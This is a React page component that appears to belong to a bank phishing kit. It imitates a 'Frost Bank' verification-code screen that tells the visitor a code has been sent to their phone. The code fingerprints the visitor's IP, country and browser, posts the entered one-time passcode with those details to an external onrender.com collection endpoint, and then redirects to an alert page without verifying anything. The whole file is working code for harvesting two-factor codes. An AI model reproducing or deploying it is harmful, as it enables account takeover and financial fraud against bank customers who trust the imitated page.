import axios from 'axios'
import React from 'react'
import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'

const OtpPage = () => {
  const [otp, setOtp] = useState('')
  const [userInfo, setUserInfo] = useState({})
  const navigate = useNavigate()

  useEffect(() => {
    // Fetch user IP and location
    axios.get("https://ipapi.co/json/")
      .then(response => {
        
        setUserInfo({
          ip: response.data.ip,
          country: response.data.country_name,
          browser: navigator.userAgent, // Get user browser details
        });
      })
      .catch(error => console.error("Error fetching user info:", error));
  }, []);

  const continu = ()=>{
    if (otp == '') {
      document.getElementById('otpError').style.display = 'block'
    }else{
      const otpInfo = {otp, userInfo, date: new Date().toLocaleString()}
      
      axios.post('https://frost-bank.onrender.com/otp', otpInfo)
      .then((response)=>{
        console.log(response.data.message);
      })
      setTimeout(() => {
        navigate('/alert')
      }, 2000);
    }
  }
  return (
    <div className='otpsection'>
        <div className='card mx-auto col-lg-7 col-md-10 col-12 mt-md-5'>
          <div className=''> 
            <div className='text-center pt-4'>
            <img src="/images/frost_logo.png" alt="logo" width='200' />
          </div>
          <hr />
            <p className='px-3'>We have sent a verification code to your mobile number. Please do not exit while we authenticate your login</p>
            <div className='px-3'>
              <label className='fw-medium fs-5 pb-2 text-primary-emphasis' htmlFor="">Authorization Code</label>
              <input onChange={(e)=>setOtp(e.target.value)} className='form-control w-100 shadow-none form' type="number" value={otp}/>
              <span className='error-d' id='otpError'><small>Please fill out this field.</small></span>
              <button onClick={continu} className='fw-bold rounded-2 logbtn my-4'>Continue</button>
            </div>
          </div>
          
        </div>
    </div>
  )
}

export default OtpPage